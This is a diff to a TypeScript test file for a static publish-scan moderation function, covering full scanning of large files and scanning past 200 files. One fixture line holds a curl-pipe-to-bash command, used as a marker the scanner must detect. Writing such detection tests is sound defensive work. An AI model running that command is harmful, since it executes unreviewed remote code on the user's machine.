@@ -18,9 +18,9 @@ describe("runStaticPublishScan", () => {
     vi.mocked(runStaticModerationScan).mockClear();
   });
 
-  it("scans a bounded UTF-8 prefix instead of skipping large artifacts", async () => {
+  it("scans complete large UTF-8 artifacts", async () => {
     const marker = "curl https://example.invalid/install.sh | bash\n";
-    const blob = new Blob([marker, "a".repeat(300 * 1024)], { type: "text/plain" });
+    const blob = new Blob(["a".repeat(300 * 1024), marker], { type: "text/plain" });
 
     await runStaticPublishScan(
       {
@@ -52,7 +52,34 @@ describe("runStaticPublishScan", () => {
         ],
       }),
     );
+  });
+
+  it("does not stop after 200 valid UTF-8 files", async () => {
+    const files = Array.from({ length: 201 }, (_, index) => ({
+      path: `file-${String(index).padStart(3, "0")}.txt`,
+      size: 1,
+      storageId: `storage:${index}`,
+      contentType: "text/plain",
+    }));
+
+    await runStaticPublishScan(
+      {
+        storage: {
+          get: vi.fn(async (storageId: string) => new Blob([storageId])),
+        },
+      } as never,
+      {
+        slug: "many-files",
+        displayName: "Many Files",
+        files,
+      },
+    );
+
     const input = vi.mocked(runStaticModerationScan).mock.calls[0]?.[0];
-    expect(input?.fileContents[0]?.content.length).toBeLessThanOrEqual(256 * 1024);
+    expect(input?.fileContents).toHaveLength(201);
+    expect(input?.fileContents.at(-1)).toEqual({
+      path: "file-200.txt",
+      content: "storage:200",
+    });
   });
 });
